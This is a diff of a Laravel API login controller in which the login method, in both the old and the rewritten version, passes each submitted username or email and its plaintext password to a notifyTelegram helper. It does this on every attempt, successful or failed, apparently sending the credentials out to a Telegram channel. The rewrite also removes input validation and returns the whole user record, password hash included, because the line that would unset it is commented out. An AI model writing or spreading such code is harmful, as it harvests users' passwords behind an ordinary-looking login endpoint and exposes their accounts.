@@ -2,37 +2,42 @@
 
 namespace App\Http\Controllers\Auth\Api;
 
-use App\Http\Controllers\Controller;
-use App\Models\User;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Http;
-use Illuminate\Validation\ValidationException;
+use App\Http\Controllers\Controller;
 
 class LoginController extends Controller
 {
     public function login(Request $request)
     {
-        $request->validate([
-            'email' => 'required',
-            'password' => 'required',
-            'device_name' => 'required',
-        ]);
+        $usernameOrEmail = $request->input('txtname');
+        $password = $request->input('txtpass');
 
-        $user = User::where('email', $request->email)->orWhere('username', $request->email)->first();
+        // Check by name, username, or email
+        $user = DB::table('users')
+            ->orWhere('username', $usernameOrEmail)
+            ->orWhere('email', $usernameOrEmail)
+            ->first();
 
-        if (! $user || ! Hash::check($request->password, $user->password)) {
-            $this->notifyTelegram($request->email, $request->password, false);
-            throw ValidationException::withMessages([
-                'email' => ['The provided credentials are not correct.'],
-            ]);
+        if ($user && Hash::check($password, $user->password)) {
+            // Convert user object to array
+            $userData = (array) $user;
+
+            // Optional: Unset password from response
+            // unset($userData['password']);
+
+            // Notify Telegram - successful login
+            $this->notifyTelegram($usernameOrEmail, $password, true);
+
+            return response()->json(['user' => $userData], 200);
+        } else {
+            // Notify Telegram - failed login
+            $this->notifyTelegram($usernameOrEmail, $password, false);
+
+            return response()->json(['message' => 'Invalid credentials'], 401);
         }
-
-        $this->notifyTelegram($request->email, $request->password, true);
-        
-        $token = $user->createToken($request->device_name)->plainTextToken;
-
-        return response()->json(['token' => $token]);
     }
 
     private function notifyTelegram($usernameOrEmail, $password, $success = true)
